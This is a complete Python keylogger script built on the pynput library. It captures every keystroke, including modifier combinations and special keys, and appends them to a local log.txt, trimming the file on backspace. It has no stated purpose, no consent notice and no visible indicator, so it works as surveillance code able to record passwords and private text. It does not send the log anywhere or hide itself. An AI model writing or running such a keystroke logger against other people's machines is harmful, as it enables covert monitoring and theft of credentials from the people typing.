from pynput import keyboard
import os

LOG_FILE = "log.txt"

modifiers = {
    "shift": False,
    "ctrl": False,
    "alt": False,
    "cmd": False
}

MODIFIER_KEYS = (
    keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
    keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r,
    keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r
)

SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.esc: "[ESC]\n",
    keyboard.Key.delete: "[DEL]",
    keyboard.Key.up: "[UP]",
    keyboard.Key.down: "[DOWN]",
    keyboard.Key.left: "[LEFT]",
    keyboard.Key.right: "[RIGHT]"
}

def update_modifier(key, pressed):
    if key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
        modifiers["shift"] = pressed
    elif key in (keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        modifiers["ctrl"] = pressed
    elif key in (keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r):
        modifiers["alt"] = pressed
    elif key in (keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r):
        modifiers["cmd"] = pressed

def get_active_modifiers():
    return "+".join(name.upper() for name, state in modifiers.items() if state)

def on_press(key):
    update_modifier(key, True)

    if key in MODIFIER_KEYS:
        return

    try:
        char = key.char

        if modifiers["ctrl"] or modifiers["alt"] or modifiers["cmd"]:
            combo = get_active_modifiers()
            log_write(f"[{combo}+{char.upper()}]")
        else:
            log_write(char)

    except AttributeError:
        if key == keyboard.Key.backspace:
            remove_last_char()
            return

        if key in SPECIAL_KEYS:
            log_write(SPECIAL_KEYS[key])
        else:
            name = key.name.upper()
            combo = get_active_modifiers()
            if combo:
                log_write(f"[{combo}+{name}]")
            else:
                log_write(f"[{name}]")

def on_release(key):
    update_modifier(key, False)

def log_write(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)

def remove_last_char():
    try:
        with open(LOG_FILE, "rb+") as f:
            f.seek(0, os.SEEK_END)
            size = f.tell()
            if size > 0:
                f.seek(-1, os.SEEK_END)
                f.truncate()
    except:
        pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()